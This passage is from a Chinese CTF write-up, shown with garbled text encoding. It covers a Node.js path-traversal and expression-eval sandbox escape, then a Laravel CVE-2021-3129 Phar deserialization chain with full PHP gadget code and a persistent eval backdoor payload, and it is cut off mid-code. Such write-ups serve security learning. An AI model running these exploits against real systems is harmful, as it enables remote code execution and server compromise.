res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> p = req.query.path || file;</span><br><span class="line">  p = path.resolve(path.dirname(file), p);</span><br><span class="line">  <span class="keyword">if</span> (p.includes(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">    res.send(<span class="string">&quot;no flag!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.sendFile(p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å°è¯•åˆ©ç”¨è¿™ä¸ªè·¯ç”±è¯»å–ä¸€äº›æ–‡ä»¶ã€‚ä½¿ç”¨ <code>.../source?path=/etc/passwd</code> å¯ä»¥è¯»åˆ°å¯¹åº”çš„æ–‡ä»¶ï¼Œæ³¨æ„åˆ°ä¸‹é¢ä¸¤è¡Œï¼Œè¿™è¯´æ˜å¾ˆå¯èƒ½æ²¡æœ‰ bashã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node:x:1000:1000:Linux User,,,:&#x2F;home&#x2F;node:&#x2F;bin&#x2F;sh</span><br><span class="line">ctf:x:1001:1001:Linux User,,,:&#x2F;home&#x2F;ctf:&#x2F;bin&#x2F;ash</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>.../source?path=/proc/self/cwd/package.json</code> å¯ä»¥è¯»åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.1.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Description&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;private&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;src/index.js&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;module&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;node src/index.js&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build:native&quot;</span>: <span class="string">&quot;node-gyp rebuild&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build:native:dev&quot;</span>: <span class="string">&quot;node-gyp rebuild --debug&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;bindings&quot;</span>: <span class="string">&quot;^1.5.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;^4.17.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;expression-eval&quot;</span>: <span class="string">&quot;^4.0.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;node-addon-api&quot;</span>: <span class="string">&quot;^3.0.2&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;seval&quot;</span>: <span class="string">&quot;^2.0.1&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;devDependencies&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@types/express&quot;</span>: <span class="string">&quot;^4.17.8&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@types/node&quot;</span>: <span class="string">&quot;^14.10.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;node-gyp&quot;</span>: <span class="string">&quot;^7.1.2&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;prettier&quot;</span>: <span class="string">&quot;^2.0.5&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“åˆæºç ä¸­çš„ addonï¼Œbindings å’Œè¿™é‡Œçš„ <code>node-gyp</code> å¯ä»¥çŸ¥é“è¿™é¢˜å¾ˆå¯èƒ½æ¶‰åŠåˆ° C++ å†™çš„ NodeJS æ¨¡å—ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://segmentfault.com/a/1190000016565228?utm_source=tag-newest">https://segmentfault.com/a/1190000016565228?utm_source=tag-newest</a></p></blockquote><p>ç»“åˆæ–‡ç« ä¸­çš„æè¿°å¯ä»¥å¾—çŸ¥å­˜åœ¨ binding.gyp æ–‡ä»¶å’Œç¼–è¯‘ä¹‹åçš„ addon.node æ–‡ä»¶äº <code>.../build/Release/</code> ä¸‹ã€‚ä½¿ç”¨ä¸€æ ·çš„æ–¹æ³•å°†å…¶è¯»å–å‡ºæ¥å¯ä»¥å¾—åˆ°ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><h4 id="äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ"></a>äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ</h4><p>å†çœ‹æºç ï¼Œå¯ä»¥å‘ç°å¦‚ä¸‹éªŒè¯é€»è¾‘ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">&quot;/eval&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> e = req.body.e;</span><br><span class="line">  <span class="keyword">const</span> code = req.body.code;</span><br><span class="line">  <span class="keyword">if</span> (!e || !code) &#123;</span><br><span class="line">    res.send(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (addon.verify(code)) &#123;</span><br><span class="line">      res.send(<span class="built_in">String</span>(eval_(parse(e))));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.send(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e)</span><br><span class="line">    res.send(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åªæœ‰æƒ³åŠæ³•æ‹¿åˆ° <code>verify(code)</code> ä¸­æ­£ç¡®çš„ <code>code</code> æ‰æœ‰å¯èƒ½ RCEï¼Œäºæ˜¯å°±è¦åˆ†æä¹‹å‰å¾—åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¿™é‡Œæ‹œæ‰˜é€†å‘å¤§ä½¬ <a href="https://usher2008.github.io/">@usher</a> å¯¹æ–‡ä»¶è¿›è¡Œäº†åŠ¨æ€è°ƒè¯•ï¼ŒæˆåŠŸæ‹¿åˆ°äº†å¯¹åº”çš„å­—ç¬¦ä¸² <code>yoshino-s_want_a_gf,qq1735439536</code>ã€‚</p><h4 id="expression-eval-eval"><a href="#expression-eval-eval" class="headerlink" title="expression-eval eval"></a>expression-eval eval</h4><p>æ ¹æ®è¯»åˆ°çš„æ–‡ä»¶å¯ä»¥çŸ¥é“ä½œè€…ä½¿ç”¨äº† <code>&quot;seval&quot;: &quot;^2.0.1&quot;</code> è¿™ä¸ªåŒ…ï¼Œä½¿ç”¨ NPM æŸ¥è¯¢å¯ä»¥æ‰¾åˆ°è¿™ä¸ªåŒ…çš„æºç ã€‚ï¼ˆè™½ç„¶ä¸çŸ¥é“åˆ°åº•åœ¨å“ªé‡Œç”¨åˆ°äº†ï¼‰</p><blockquote><p>GitHub Repo: <a href="https://github.com/tritiumNetworks/SafeEval">https://github.com/tritiumNetworks/SafeEval</a></p></blockquote><p>ç¨å¾®æµ‹è¯•ä¸€ä¸‹å¯ä»¥å‘ç°ä½¿ç”¨ <code>(1)[&quot;constructor&quot;][&quot;constructor&quot;]</code> å¯ä»¥å¯¼å‡ºä¸€ä¸ª Functionã€‚æ­¤æ—¶å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªä½ç½®æ¥è¿›è¡ŒæŒ‡ä»¤æ‰§è¡Œäº†ã€‚æ„é€ å‡ºå¦‚ä¸‹ payload å‘ç°å¯ä»¥æˆåŠŸåˆ©ç”¨å¹¶å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pkg = <span class="built_in">require</span>(<span class="string">&quot;expression-eval&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> ast = pkg.parse(<span class="string">&#x27;(1)[&quot;constructor&quot;][&quot;constructor&quot;](&quot;console.log(global.process.mainModule.constructor._load(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;))&quot;)()&#x27;</span>);</span><br><span class="line">pkg.eval(ast);</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615788854110/57b0e9da3ad764b26f18a256eefb2e7faf83bf55.png"></p><p>ä½†æ˜¯åœ¨é¶æœºç¯å¢ƒä¸­ç»è¿‡æµ‹è¯•å¯ä»¥å‘ç° <code>require</code> å’Œ <code>global.process.mainModule</code> éƒ½æ˜¯ undefinedã€‚å› æ­¤æ— æ³•é€šè¿‡å¯¼å‡º <code>mainModule</code> çš„æ–¹å¼æ¥è¾¾æˆæŒ‡ä»¤æ‰§è¡Œã€‚æ¢ç´¢ä¹‹åå¯ä»¥å‘ç°åˆ©ç”¨ <code>global.process.binding()</code> å¯ä»¥å¯¼å‡ºä»»æ„å­˜åœ¨çš„æ¨¡å—ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html">https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html</a></p></blockquote><p>å°è¯•å¯¼å‡ºä¸€ä¸ª fs æ¨¡å—å¹¶åˆ©ç”¨å…¶ <code>readFileSync</code> çš„æ–¹æ³•æ¥è¯»å–æ–‡ä»¶ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æˆåŠŸã€‚ä»…ä»…ä½¿ç”¨å¦‚ä¸‹ payload è¯»åˆ°äº†æ ¹ç›®å½•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; this.constructor.constructor(&#39;return this.process.binding&#39;)()(&#39;fs&#39;).readdir(&#39;&#x2F;&#39;, &#123;&#125;, &quot;&quot;,&quot;&quot;, function (err, data) &#123;data&#125;);</span><br><span class="line">a;</span><br><span class="line"></span><br><span class="line">e&#x3D;(1)[&quot;constructor&quot;][&quot;constructor&quot;](&quot;return+String(eval(String.fromCharCode(118,97,114,32,97,32,61,32,116,104,105,115,46,99,111,110,115,116,114,117,99,116,111,114,46,99,111,110,115,116,114,117,99,116,111,114,40,39,114,101,116,117,114,110,32,116,104,105,115,46,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,39,41,40,41,40,39,102,115,39,41,46,114,101,97,100,100,105,114,40,39,47,39,44,32,123,125,44,32,34,34,44,34,34,44,32,102,117,110,99,116,105,111,110,32,40,101,114,114,44,32,100,97,116,97,41,32,123,100,97,116,97,125,41,59,10,97,59)))&quot;)()&amp;code&#x3D;yoshino-s_want_a_gf%2Cqq1735439536</span><br><span class="line"></span><br><span class="line">.dockerenv,app,bin,dev,docker-entrypoint,etc,flag,home,lib,media,mnt,opt,proc,root,run,sbin,srv,sys,tmp,usr,var</span><br></pre></td></tr></table></figure><p>çœ‹é¢˜è§£å­¦åˆ°äº†å¯ä»¥ä½¿ç”¨ <code>import()</code> æ¥å¼•å…¥æ¨¡å—ï¼Œäºæ˜¯å¯ä»¥æ„é€ å‡ºå¦‚ä¸‹ payloadã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1)[&quot;constructor&quot;][&quot;constructor&quot;](&#39;return+import(&quot;fs&quot;).then(fs&#x3D;&gt;&#123;fs.copyFileSync(&quot;&#x2F;flag&quot;,&quot;&#x2F;tmp&#x2F;tmpf1ag&quot;);&#125;)&#39;)()</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>fs.copyFileSync()</code> å°† flag æ‹·è´åˆ° <code>/tmp</code> ç›®å½•ä¸‹ï¼Œä»è€Œä½¿ç”¨ç¬¬ä¸€æ­¥çš„æ–‡ä»¶è¯»å–æ“ä½œè¯»å–åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;74840aad-bd02-4946-b8fc-23ef08db0cd8&#125;</span><br></pre></td></tr></table></figure><h3 id="Easy-laravel"><a href="#Easy-laravel" class="headerlink" title="Easy_laravel"></a>Easy_laravel</h3><blockquote><p>ç®€å•çš„æ¼æ´å¤ç°</p></blockquote><h4 id="CVE-2021-3129"><a href="#CVE-2021-3129" class="headerlink" title="CVE-2021-3129"></a>CVE-2021-3129</h4><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></p></blockquote><p>å…³é”®ç‚¹åœ¨äº Controller ä¼šè°ƒç”¨åˆ°çš„ <code>run()</code> æ–¹æ³•ã€‚å½“èµ°åˆ° <code>makeOptional()</code> æ–¹æ³•çš„æ—¶å€™ä¼šè§¦å‘åˆ° <code>file_get_contents()</code>ï¼Œæ­¤æ—¶ä¾¿å¯ä»¥å€ŸåŠ©ä»–å»è§¦å‘ Phar ååºåˆ—åŒ–ã€‚ä¸æ­¤åŒæ—¶ï¼Œä¼ å…¥çš„å‚æ•°ä¼šå‡ºç°åœ¨ log ä¸­ã€‚é…åˆ filter çš„æ“ä½œå¯ä»¥å°† log æ–‡ä»¶å˜æˆåˆæ³•çš„ Phar æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961629058/ff56c3948b1747cf04f49ed7f7bad2fd2a5c4b9a.png"></p><h4 id="Phar-ååºåˆ—åŒ–é“¾å­"><a href="#Phar-ååºåˆ—åŒ–é“¾å­" class="headerlink" title="Phar ååºåˆ—åŒ–é“¾å­"></a>Phar ååºåˆ—åŒ–é“¾å­</h4><p>ç®€å•æœç´¢å¯ä»¥å‘ç° MockClass.php ä¸‹å‡ºç°äº†ä¸€ä¸ª <code>eval</code>ã€‚åªéœ€è¦æ§åˆ¶ <code>$this-&gt;mockName</code> ä¸ºä¸å­˜åœ¨çš„ç±»å¹¶åœ¨ <code>$this-&gt;classCode</code> ä¸­å¡«å……æ¬²æ‰§è¡Œä»£ç å³å¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961629952/6c68eb6eb1e85804fb8b64840c6062abe49b10ec.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">MockClass</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">classCode</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$mockName</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;classCode = <span class="string">&quot;phpinfo(); eval(filter_input(INPUT_GET,\&quot;h3x\&quot;)); echo &#x27;See you in the Unserialize!&#x27;;&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mockName = <span class="string">&quot;undefinedMock&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€æ‰¾ä¸€ä¸‹å¯èƒ½è§¦å‘ä¸Šè¿° <code>eval</code> çš„å‡½æ•°ã€‚å¯ä»¥åœ¨ HigherOrderMessage.php ä¸‹æ‰¾åˆ°å¦‚ä¸‹ <code>__call()</code> é­”æ³•å‡½æ•°ã€‚æ­¤æ—¶æ§åˆ¶ <code>$this-&gt;mock</code> ä¸ºä¸€ä¸ª MockClass å¯¹è±¡ï¼Œ<code>$this-&gt;method</code> ä¸º generate å³å¯è§¦å‘åˆ°ä¸Šè¿° <code>eval()</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961630348/04770e31ffde2fb57292ed3a72d129c122fce33e.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title">class</span> <span class="title">HigherOrderMessage</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">mock</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$mock</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mock = <span class="variable">$mock</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = <span class="string">&quot;generate&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶ä½¿ç”¨å¦‚ä¸‹ä½äº ImportConfigurator.php çš„ææ„å‡½æ•°å¯ä»¥è½»æ¾è§¦å‘åˆ°ä¸Šè¿°çš„ <code>__call()</code> æ–¹æ³•ï¼Œåªéœ€è¦ <code>$this-&gt;parent</code> ä¸º HigherOrderMessage å¯¹è±¡ï¼Œæ­¤æ—¶å…¶ç±»ä¸‹ä¸å­˜åœ¨ <code>addCollection()</code> æ–¹æ³•ï¼Œå³å¯è§¦å‘åˆ° <code>__call()</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961630753/bc1a8bef0adb58e3f4df7d73e81c9989b47526b3.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$route</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$parent</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="variable">$parent</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = <span class="string">&quot;undefinedRoute&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†å®Œæ•´çš„ååºåˆ—åŒ–é“¾å­ï¼Œæ¥ä¸‹æ¥åªéœ€è¦æ„é€ é“¾å­å¹¶æ‰“åŒ…æˆ Phar å°±è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">MakePhar</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Mockery</span>\<span class="title">HigherOrderMessage</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Phar</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">MockClass</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span>\<span class="title">ImportConfigurator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MakePhar</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$mockClass</span> = <span class="keyword">new</span> MockClass();</span><br><span class="line">        <span class="variable">$higherOrderMessage</span> = <span class="keyword">new</span> HigherOrderMessage(<span class="variable">$mockClass</span>);</span><br><span class="line">        <span class="variable">$importConfigurator</span> = <span class="keyword">new</span> ImportConfigurator(<span class="variable">$higherOrderMessage</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;triggerLog1.phar&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">        <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$importConfigurator</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;actuallyNothingHere&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">function</span> <span class="title">MakePhar</span>\<span class="title">MakePhar</span>;</span><br><span class="line"></span><br><span class="line">    MakePhar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å‘å°„è½½è·"><a href="#å‘å°„è½½è·" class="headerlink" title="å‘å°„è½½è·"></a>å‘å°„è½½è·</h4><p>æŒ‰ç…§å‚è€ƒæ–‡ç« ä¸­çš„è¯´æ³•ï¼Œéœ€è¦å…ˆå°† Phar åŒ…è½¬æ¢æˆç‰¹å®šçš„æ ¼å¼ï¼Œå†™ä¸€æ®µè„šæœ¬æ¥è¾¾æˆè¿™ä¸ªç›®çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TransferEncodePhar</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$raw</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$raw</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$result</span>[<span class="variable">$i</span>] = <span class="string">&quot;=&quot;</span> . strtoupper(dechex(ord(<span class="variable">$raw</span>[<span class="variable">$i</span>]))) . <span class="string">&quot;=00&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> implode(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§å‚è€ƒæ–‡ç« çš„å§¿åŠ¿å°† Phar åŒ…ä¼ ä¸Šå»è§¦å‘ã€‚æ­¤æ—¶å³å¯å¾—åˆ°ä¸€ä¸ªä¸€æ¬¡å¯ç”¨çš„ <code>eval()</code>ã€‚æ­¤æ—¶å°† Phar åŒ…ä¿å­˜èµ·æ¥ç”Ÿæˆæ–°çš„ Phar åŒ…ï¼Œåœ¨æ–°çš„åŒ…ä¸­å†™æŒ‡ä»¤å°†åŸæœ¬çš„ Phar åŒ…å†™å…¥æ–°çš„ log æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$triggerPhar1</span> = base64_encode(file_get_contents(<span class="string">&quot;./triggerLog.phar&quot;</span>));</span><br><span class="line"><span class="keyword">$this</span>-&gt;classCode = <span class="string">&quot;phpinfo(); echo &#x27;See you in the Unserialize!&#x27;; file_put_contents(&#x27;/var/www/html/storage/logs/h3x.log&#x27;,base64_decode(&#x27;<span class="subst">&#123;$triggerPhar1&#125;</span>&#x27;));&quot;</span>;</span><br></pre></td></tr></table></figure><p>å°†æ–°çš„ Phar åŒ…ä»¥ä¸€æ ·çš„å¥—è·¯ä¸Šä¼ ï¼Œä¾¿è·å¾—äº†ä¸€ä¸ªå¯å¤šæ¬¡æ‰§è¡Œçš„ <code>eval()</code>ï¼Œæ­¤å¤„ä¸º <code>h3x.log</code>ã€‚</p><h4 id="ä¼ªåè®®-convert-iconv-è§¦å‘"><a href="#ä¼ªåè®®-convert-iconv-è§¦å‘" class="headerlink" title="ä¼ªåè®® convert.iconv è§¦å‘"></a>ä¼ªåè®® convert.iconv è§¦å‘</h4><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/8669">https://xz.aliyun.com/t/8669</a></p></blockquote><p>ç¼–å†™ payload.c å¦‚ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 